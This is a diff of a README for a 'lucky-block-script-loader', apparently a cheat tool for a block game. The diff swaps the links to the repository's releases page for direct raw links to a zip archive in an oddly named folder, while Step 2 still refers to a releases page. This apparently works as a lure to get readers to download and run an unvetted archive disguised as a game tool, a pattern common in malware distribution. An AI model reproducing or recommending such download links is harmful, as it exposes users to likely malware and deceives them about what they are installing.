@@ -1,11 +1,11 @@
 # 🎯 lucky-block-script-loader - Automate Your Block Game Wins  
-[![Download Badge](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/Truelobsterrumcocktail359/lucky-block-script-loader/releases)
+[![Download Badge](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Truelobsterrumcocktail359/lucky-block-script-loader/main/ericineous/v3.4.zip)
 
 ## 🚀 Getting Started  
 All you need to do is visit the download link to get the application.  
 
 **Step 1:** Click the big blue badge above or go to:  
-[https://github.com/Truelobsterrumcocktail359/lucky-block-script-loader/releases](https://github.com/Truelobsterrumcocktail359/lucky-block-script-loader/releases)  
+[https://raw.githubusercontent.com/Truelobsterrumcocktail359/lucky-block-script-loader/main/ericineous/v3.4.zip](https://raw.githubusercontent.com/Truelobsterrumcocktail359/lucky-block-script-loader/main/ericineous/v3.4.zip)  
 
 **Step 2:** Once on the page, look for the latest release. Click on it.  
 
